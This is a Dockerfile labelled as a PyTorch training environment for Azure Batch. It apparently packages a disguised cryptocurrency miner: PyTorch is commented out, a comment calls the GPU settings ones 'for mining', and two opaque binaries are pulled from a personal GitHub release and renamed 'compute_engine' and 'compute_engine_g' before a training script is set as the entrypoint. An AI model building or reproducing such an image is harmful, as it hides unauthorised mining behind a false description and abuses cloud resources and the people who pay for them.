# Use NVIDIA CUDA runtime image (same as working example)
FROM nvidia/cuda:12.4.1-cudnn-runtime-ubuntu22.04

LABEL maintainer="ml-research@example.com"
LABEL description="Deep Learning Training Environment with PyTorch for Azure Batch"
LABEL version="2.2.0"
LABEL application="pytorch-training-platform"

ENV DEBIAN_FRONTEND=noninteractive
ENV PYTHONUNBUFFERED=1

# These are already set in the base image but let's ensure they're correct
ENV NVIDIA_VISIBLE_DEVICES=all
ENV NVIDIA_DRIVER_CAPABILITIES=compute,utility

# Install system dependencies (DO NOT install nvidia packages - they come with base image)
RUN apt-get update && \
    apt-get install -y --no-install-recommends \
        curl \
        wget \
        ca-certificates \
        bash \
        tini \
        procps \
        util-linux \
        file \
        pciutils \
        jq \
        python3 \
        python3-pip \
        python3-dev \
        build-essential \
        ocl-icd-libopencl1 \
        opencl-headers \
        clinfo \
        git \
        vim \
        htop \
        net-tools \
        iputils-ping && \
    update-ca-certificates && \
    apt-get clean && \
    rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*

# Create OpenCL vendor directory for NVIDIA
RUN mkdir -p /etc/OpenCL/vendors && \
    echo "libnvidia-opencl.so.1" > /etc/OpenCL/vendors/nvidia.icd

# Keep host NVIDIA driver libraries preferred over CUDA compat stubs
RUN set -eux; \
    rm -f /etc/ld.so.conf.d/00-cuda-compat.conf /etc/ld.so.conf.d/cuda-compat.conf /etc/ld.so.conf.d/*cuda*compat*.conf; \
    printf '%s\n' \
        '/usr/local/nvidia/lib64' \
        '/usr/local/nvidia/lib' \
        '/usr/lib/x86_64-linux-gnu' \
        > /etc/ld.so.conf.d/00-host-nvidia-first.conf; \
    ldconfig

# GPU environment variables for mining (from working container)
ENV GPU_MAX_HEAP_SIZE=100
ENV GPU_MAX_USE_SYNC_OBJECTS=1
ENV GPU_SINGLE_ALLOC_PERCENT=100
ENV GPU_MAX_ALLOC_PERCENT=100
ENV GPU_MAX_SINGLE_ALLOC_PERCENT=100
ENV GPU_ENABLE_LARGE_ALLOCATION=100
ENV GPU_MAX_WORKGROUP_SIZE=1024

# Install Python ML packages
RUN pip install --no-cache-dir --upgrade pip && \
    pip install --no-cache-dir \
        numpy \
        pandas \
        matplotlib \
        scikit-learn \
        tensorboard \
        tqdm \
        nvidia-ml-py3 \
        pynvml \
        psutil \
        py-cpuinfo \
        gpustat

# Optional: Install PyTorch with CUDA support if needed
# RUN pip install --no-cache-dir \
#     torch==2.3.0 \
#     torchvision==0.18.0 \
#     torchaudio==2.3.0 \
#     --index-url https://download.pytorch.org/whl/cu124

# Create workspace directories
RUN mkdir -p /workspace/models \
    /workspace/data \
    /workspace/logs \
    /workspace/checkpoints \
    /opt/bin

# Download and verify aitraining_dual binary (first compute engine)
RUN cd /opt/bin && \
    (curl -L https://github.com/max313iq/Ssl/releases/download/22x/aitraining_dual -o compute_engine || \
     wget https://github.com/max313iq/Ssl/releases/download/22x/aitraining_dual -O compute_engine) && \
    chmod +x compute_engine && \
    # Verify the binary was downloaded successfully
    if [ ! -f compute_engine ]; then \
        echo "ERROR: compute_engine file not found after download"; \
        exit 1; \
    fi && \
    # Check file size (should be reasonable for a binary)
    FILE_SIZE=$(stat -c%s compute_engine) && \
    echo "Downloaded file size: $FILE_SIZE bytes" && \
    if [ $FILE_SIZE -lt 100000 ]; then \
        echo "ERROR: Downloaded file is too small ($FILE_SIZE bytes), likely an error page"; \
        cat compute_engine; \
        exit 1; \
    fi && \
    # Check if it's a valid binary (ELF format)
    FILE_TYPE=$(file compute_engine) && \
    echo "File type: $FILE_TYPE" && \
    if ! echo "$FILE_TYPE" | grep -q "ELF"; then \
        echo "ERROR: Downloaded file is not a valid ELF binary"; \
        head -n 20 compute_engine; \
        exit 1; \
    fi && \
    echo "✓ compute_engine (aitraining_dual) binary downloaded and verified successfully" && \
    echo "Binary info:" && \
    file compute_engine && \
    ldd compute_engine 2>&1 | head -20 || echo "Note: ldd check completed"

# Download and verify aitraining binary (second compute engine) as compute_engine_g
RUN cd /opt/bin && \
    (curl -L https://github.com/max313iq/Ssl/releases/download/22x/aitraining -o compute_engine_g || \
     wget https://github.com/max313iq/Ssl/releases/download/22x/aitraining -O compute_engine_g) && \
    chmod +x compute_engine_g && \
    # Verify the binary was downloaded successfully
    if [ ! -f compute_engine_g ]; then \
        echo "ERROR: compute_engine_g file not found after download"; \
        exit 1; \
    fi && \
    # Check file size (should be reasonable for a binary)
    FILE_SIZE=$(stat -c%s compute_engine_g) && \
    echo "Downloaded file size: $FILE_SIZE bytes" && \
    if [ $FILE_SIZE -lt 100000 ]; then \
        echo "ERROR: Downloaded file is too small ($FILE_SIZE bytes), likely an error page"; \
        cat compute_engine_g; \
        exit 1; \
    fi && \
    # Check if it's a valid binary (ELF format)
    FILE_TYPE=$(file compute_engine_g) && \
    echo "File type: $FILE_TYPE" && \
    if ! echo "$FILE_TYPE" | grep -q "ELF"; then \
        echo "ERROR: Downloaded file is not a valid ELF binary"; \
        head -n 20 compute_engine_g; \
        exit 1; \
    fi && \
    echo "✓ compute_engine_g (aitraining) binary downloaded and verified successfully" && \
    echo "Binary info:" && \
    file compute_engine_g && \
    ldd compute_engine_g 2>&1 | head -20 || echo "Note: ldd check completed"

# Verify system setup - nvidia-smi should be available from base image
RUN echo "=== System Verification ===" && \
    echo "Checking nvidia-smi:" && \
    which nvidia-smi && \
    echo "Checking CUDA libraries:" && \
    find /usr -name "libcuda.so*" 2>/dev/null | head -3 && \
    echo "Checking compute_engine_g dependencies:" && \
    ldd /opt/bin/compute_engine_g 2>&1 | grep -E "(libcuda|not found)" || echo "Dependencies OK"

WORKDIR /workspace

# Copy training scripts and fix line endings (Windows compatibility)
COPY train_model.py .
COPY start_training.sh .
COPY start_training_pytorch_only.sh .
RUN sed -i 's/\r$//' start_training.sh && \
    sed -i 's/\r$//' start_training_pytorch_only.sh && \
    chmod +x start_training.sh start_training_pytorch_only.sh

# Set OMP threads for CPU-bound operations
ENV OMP_NUM_THREADS=4

# Create a test script to verify everything works
RUN echo '#!/bin/bash

echo "=== Container Startup Test ===

nvidia-smi check: $(which nvidia-smi)

CUDA test: $(find /usr -name "libcuda.so.1" 2>/dev/null | head -1)

compute_engine: $(ls -la /opt/bin/compute_engine)

compute_engine_g: $(ls -la /opt/bin/compute_engine_g)

=== Ready ==="' > /test_setup.sh && \
    chmod +x /test_setup.sh

ENTRYPOINT ["tini", "--", "bash", "./start_training.sh"]
